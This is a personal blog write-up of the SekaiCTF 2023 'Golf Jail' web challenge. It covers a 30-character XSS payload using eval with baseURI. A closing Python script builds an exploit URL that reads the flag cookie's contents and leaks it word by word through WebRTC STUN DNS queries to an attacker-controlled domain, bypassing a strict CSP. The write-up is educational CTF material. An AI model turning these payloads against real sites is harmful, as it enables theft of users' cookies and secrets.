---

layout: post

title: "SekaiCTF-23"

date: 2023-08-29 

tag-name: web tiny-xss jsjail strict-csp webrtc

---

# Web - Golf Jail

`I hope you like golfing ⛳🏌️⛳🏌️` 

Stats : 16 solves / 475 pts 

Difficulty: ⭐⭐⭐⭐

Author: strellic

## Introduction

The challenge code is really small, it's ~24 lines of code 

```php
<?php
    header("Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';");
    header("Cross-Origin-Opener-Policy: same-origin");

    $payload = "🚩🚩🚩";
    if (isset($_GET["xss"]) && is_string($_GET["xss"]) && strlen($_GET["xss"]) <= 30) {
        $payload = $_GET["xss"];
    }

    $flag = "SEKAI{test_flag}";
    if (isset($_COOKIE["flag"]) && is_string($_COOKIE["flag"])) {
        $flag = $_COOKIE["flag"];
    }
?>
<!DOCTYPE html>
<html>
    <body>
        <iframe
            sandbox="allow-scripts"
            srcdoc="<!-- <?php echo htmlspecialchars($flag) ?> --><div><?php echo htmlspecialchars($payload); ?></div>"
        ></iframe>
    </body>
</html>
```

The idea is straightforward here, we need to achieve XSS with just 30 chars and bypassing this really strict CSP

## Day 1 - Chasing the rabbit down the hole

Although the idea of the challenge is really simple, it's really hard to find a proper way to exploit it. 
The first thing that came to my mind was to look for some really <mark class="hltr-orange">tiny XSS payload</mark> , so i googled for `tiny xss` and looked if i can find something useful.

With no surprise the shortest payload that i've found was `<svg/onload=eval(name)>` which is 23 chars long. I thought that maybe i can find something even smaller but apparently this is the shortest at the moment.

How this payload works by the way? It's <mark class="hltr-orange">indeed simple</mark> because `name` is a shorthand for `window.name` which is a variable that contains the name of the window in the browsing context.
The really cool thing is that we can set the `window.name` property using the second parameter of the `window.open` function.
So if we can make the bot visit a site that we control we can open a new window with an arbitrary name and evaluate it to achieve xss

But in our case this won't work, because the bot will only visits url that matches this regex `/^https:\/\/golfjail\.chals\.sekai\.team\//` 

Another payload that i thought about was to use `location.hash` but this will be way more chars than the one allowed
Looking through https://tinyxss.terjanq.me/ i've found about this payload `<script/src=//Ǌ.₨></script>` which is 27 chars long
But even this one won't work due to strict CSP which states `script-src 'unsafe-inline' 'unsafe-eval'` so no external scripts allowed

At this point it started to become frustrating, but suddenly i remembered about a challenge written by <mark class="hltr-orange">@aszx87410</mark> about an XSS with a very strict chars limit

So i googled `aszx87410 0222 intigriti` to try to find some new inspiration

### It's all about URL

The writeup for the [challenge](https://github.com/aszx87410/ctf-writeups/issues/49) (and obviously the challenge) is <mark class="hltr-orange">really good</mark>. Here the author consider a payload that i haven't thought about before 
```html
<svg/onload=eval(`'`+URL)> 
``` 
In the writeup is explained perfectly how the payload is supposed to work, and how to craft an url that fits the `eval` and can be used to execute javascript code

All we need to know for the challenge purposes was that if we supply an URL like this 
```
https://golfjail.chals.sekai.team/?xss=<svg/onload=eval(`'`+URL)>#';console.log(1)
```
The xss parameter will be less than 30 chars, and the URL will be valid syntax to be evaluated from `eval` to achieve XSS

So were is the problem here? It's simple, <mark class="hltr-orange">this won't work anymore</mark>. Beacause URL is a function and doesn't give the URL of the page so this seems like a dead end

Ok seriously now i was on the verge of a mental breakdown, so i decided that it was better to go to sleep and start the morning after

## Day 2 - Do you believe in magic?

It was clear at this point that we need some sort of placeholder in order to bypass the chars limit, and the only thing we can control was the URL only.
So i started digging into the js documentation, html specification and every kind of blog-post regarding javascript to find the tiniest spark of hope to get XSS

After 2 or 3 hours of digging in depth of the web and after a bit of fuzzing i've found this property `Node.baseURI` which returns the <mark class="hltr-orange">absolute base URL</mark> of the document containing the node
This was interesting enough to spend some time on time, but i was completely shocked when from inside the iframe the `document.baseURI` property returned the location of the <mark class="hltr-orange">top window</mark> 

This literally blew my mind, but now i knew which placeholder i can use to bypass the 30 chars length
```html
<svg/onload=eval(`'`+baseURI)>
```
The last thing to mention here is that we can omit `document` and just use `baseURI` because `document` is implicitly used, so the payload will be exactly 30 chars !

### Stealing strellic exploit

Ok, so we have xss and now we need to exfiltrate the flag. Fortunately this part was easy for me because right from the start i knew a way to bypass that really strict CSP. The way is <mark class="hltr-orange">webRTC</mark> .
Why do i knew it? From another strellic challenge of course. The challenge was released in the corCTF23 and the name is [crabspace](https://brycec.me/posts/corctf_2023_challenges#crabspace), which basically uses webRTC to exfiltrate data
So i <s>stolen</s> borrowed the payload from his writeup and used it to perform exfiltration

## Leaking all the things

I've automated the exploit due to the fact that i've had some hard time to exfiltrate data via webRTC because of some special chars in the flag.
Basically what i did in the exploit was to take the flag from inside the iframe via `document.firstChild.textContent` and split it by the underscore to leak it <mark class="hltr-orange">word by word</mark> 

The funny part here is that when i've tried to leak the last word of the flag, something didn't work apparently so my guess was that there will be some special chars at the end of the word that breaks the DNS query
So i need to tweak my exploit a bit to leak the flag

```python
import requests
import base64

URL = "https://golfjail.chals.sekai.team/?xss=<svg/onload=eval(`'`%2bbaseURI)>#';"

payload = """
var index = 0;
var pay=document.firstChild.textContent.trim().split('{')[1].split('}')[0].split("_")[index];
pc = new RTCPeerConnection({'iceServers':[{'urls':['stun:'+pay+'.my_mess_with_dns']}]});
pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));
"""

payload = payload.replace("\n","")
payload = base64.b64encode(payload.encode())
payload = b"eval(atob('"+payload+b"'))";
print(URL+payload.decode("utf-8"))

#SEKAI{jsjails_4re_b3tter_th4n_pyjai1s!}
```

Notice that has i've said before, you need to change the `index` value every time to leak every word, and for the last word i've exfiltrated all of it besides the last char. 
To be more specific, the last char was exfiltrated by taking is charCode and leaking it, then i
converted it back to its original value

## Conclusion

The challenge was really fun to play and i've learn a lot of new things. As always strelli challs are a goldmine, definitely want to play the other challenge which is leakless-note in order to learn novel xs-leak technique

